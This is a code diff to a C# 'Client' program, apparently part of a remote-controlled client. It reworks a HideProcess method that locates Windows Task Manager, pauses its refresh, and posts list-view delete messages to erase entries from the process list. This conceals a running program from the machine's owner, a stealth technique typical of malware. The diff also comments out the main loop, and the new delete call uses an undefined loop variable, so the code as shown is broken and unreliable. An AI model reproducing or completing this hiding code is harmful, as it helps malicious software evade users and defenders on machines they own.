@@ -28,7 +28,7 @@ namespace Client
 
             Console.WriteLine("--");
 
-            do
+           /* do
             {
                 // If we are offline.
                 while (_ThisPC.Status == LocalMachine.State.OFFLINE)
@@ -50,7 +50,7 @@ namespace Client
 
                 Thread.Sleep(1000);
             } while (true);
-        }
+        */}
 
         private static void Init()
         {
@@ -74,23 +74,18 @@ namespace Client
 
         private static void HideProcess()
         {
-            List<Process> procList = System.Diagnostics.Process.GetProcesses().ToList();
-
             IntPtr lhWndParent = DKOM.FindWindow(null, "Task Manager");
             Console.WriteLine("Handle:\t" + lhWndParent + " - " + lhWndParent.ToString("X"));
 
-            IntPtr lhWndDialog = new IntPtr(),
-                lhWndProcessList = new IntPtr(),
-                lhWndProcessHeader = new IntPtr();
+            IntPtr lhTaskManagerMain = new IntPtr(),
+                   lhDirectUIHWND = new IntPtr(),
+                   lhSysListView32 = new IntPtr(),
+                   lhSysHeader32 = new IntPtr();
 
             // Get Task manager menus
             IntPtr hMenu = DKOM.GetMenu(lhWndParent);
             IntPtr hSubMenu = DKOM.GetSubMenu(hMenu, 2);
             IntPtr hSubSubMenu = DKOM.GetSubMenu(hSubMenu, 1);
-
-            Console.WriteLine("'View' Menu:\t" + hMenu + "\t- " + hMenu.ToString("X") +
-                              "\n'RefreshSpeed' Menu:\t" + hSubMenu + "\t- " + hSubMenu.ToString("X") + 
-                              "\n'Speed' Menu:\t" + hSubSubMenu + "\t- " + hSubSubMenu.ToString("X"));
             
             // Refresh now button
             Int32 refreshNowButton = DKOM.GetMenuItemID(hSubMenu, 0);
@@ -104,7 +99,6 @@ namespace Client
                 DKOM.GetMenuItemID(hSubSubMenu, 3)
             };
 
-            Console.WriteLine("Pause:\t" + updateNowList[3] + "\t- " + updateNowList[3].ToString("X"));
             
             //Force clicking of the pause
             DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, updateNowList[3] , 0);
@@ -115,45 +109,40 @@ namespace Client
             }
             DKOM.EnableMenuItem(hMenu, (uint)refreshNowButton, DKOM.MF_ENABLED);
 
-            IntPtr uiInner = new IntPtr();
-            lhWndDialog = DKOM.FindWindowEx(lhWndParent, lhWndDialog, null, null);
-            uiInner = DKOM.FindWindowEx(lhWndDialog, uiInner, null, null);
+            // Start working our way down the UI classes to the listview
+            lhTaskManagerMain = DKOM.FindWindowEx(lhWndParent, lhTaskManagerMain, null, null);
+            lhDirectUIHWND = DKOM.FindWindowEx(lhTaskManagerMain, lhDirectUIHWND, null, null);
 
             // Step through the task manager inner windows looking for the process lists
             for (int i = 0; i < 7; i++)
             {
-
-                lhWndProcessList = DKOM.FindWindowEx(uiInner, lhWndProcessList, null , null);
-                Console.WriteLine("Searching class: " + lhWndProcessList.ToString("X"));
+                lhSysListView32 = DKOM.FindWindowEx(lhDirectUIHWND, lhSysListView32, null , null);
+                Console.WriteLine("Searching class: " + lhSysListView32.ToString("X"));
                 
-                if (DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
+                if (DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                 {
                     Console.WriteLine(" ^ HIT.");
-                    lhWndProcessList = DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysListView32", null);
-                    lhWndProcessHeader = DKOM.FindWindowEx(lhWndProcessList, IntPtr.Zero, "SysHeader32", null);
+                    lhSysListView32 = DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null);
+                    lhSysHeader32 = DKOM.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysHeader32", null);
                     break;
                 }
             }
 
+            DKOM.LockWindowUpdate(lhSysListView32);
             
-            //DKOM.PostMessage(lhWndProcessList, 0x1075, 0, req);
 
 
-            //Not sure if this does anything.
+            DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, refreshNowButton, 0); //Refresh
+            DKOM.PostMessage(lhSysListView32, DKOM.LVM_SORTITEMS, 0, 0);         //Sort
+            DKOM.PostMessage(lhSysListView32, DKOM.LVM_DELETEITEM, i, 0);        //Delete
+          
+            
+            DKOM.LockWindowUpdate(IntPtr.Zero);
 
-            //DKOM.LockWindowUpdate(lhWndProcessList);
-            //DKOM.PostMessage(lhWndProcessList, DKOM.LVM_SORTITEMS, 0, 0);
-           // DKOM.LockWindowUpdate(IntPtr.Zero);
-/*            for (int i = 0; i < procList.Count - 1; i++)
-            {
-                DKOM.PostMessage(lhWndProcessList, DKOM.LVM_DELETEITEM, i, 0);
-            }
-            */
+          
+            
 
-            Console.WriteLine("Inner Menu: " + lhWndDialog + " - " + lhWndDialog.ToString("X") + "\nuiInner: " + uiInner + " - " + uiInner.ToString("X")
-                + " \nlhWndProcessList: " + lhWndProcessList + " - " + lhWndProcessList.ToString("X") + "\nlhWndProcessHeader: " + lhWndProcessHeader + " - " + lhWndProcessHeader.ToString("X"));
-
-        }
+       }
 
     }
 }
